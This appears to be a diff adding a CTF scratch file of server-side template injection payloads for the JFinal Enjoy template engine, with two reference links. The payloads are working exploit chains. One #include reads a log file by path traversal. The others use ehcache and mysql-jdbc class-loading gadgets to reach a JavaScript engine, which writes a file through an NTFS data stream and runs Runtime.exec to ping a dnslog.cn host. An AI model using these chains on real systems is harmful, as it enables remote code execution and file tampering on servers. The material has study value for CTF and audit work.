@@ -1,0 +1,17 @@
+https://p1n93r.github.io/post/code_audit/jfinal_enjoy_template_engine%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/
+
+https://www.bookstack.cn/read/jfinal-4.8/09006a00d50c23b5.md
+
+
+#include("../log/jfinal-blog.log")
+
+#set(script_e=net.sf.ehcache.util.ClassLoaderUtil::createNewInstance("javax.script.ScriptEngineManager"))#set(script_j=script_e.getEngineByName("js"))#set(exp="new java.io.BufferedWriter(new java.io.FileWriter('C:\\Users\\ctf\\jfinal-blog\\jfinal-blog\\webapp\\upload\\image\\2.txt::$DATA'));out.write(java.net.URLDecoder.decode('1231321231'));out.close();")#(script_j.eval(exp))
+
+
+
+#set(script_e=net.sf.ehcache.util.ClassLoaderUtil::createNewInstance("javax.script.ScriptEngineManager"))#set(script_j=script_e.getEngineByName("js"))#set(exp="java.lang.Runtime.getRuntime().exec('ping kmvqho.dnslog.cn')")#(script_j.eval(exp))
+
+java.lang.Runtime.getRuntime().exec('ping kmvqho.dnslog.cn')
+
+
+#((com.mysql.jdbc.Util::handleNewInstance(((java.net.URLClassLoader::getSystemClassLoader()).loadClass("javax.script.ScriptEngineManager").getDeclaredConstructor()),null,null)).getEngineByExtension("js").eval("java.lang.Runtime.getRuntime().exec('ping kmvqho.dnslog.cn')"))
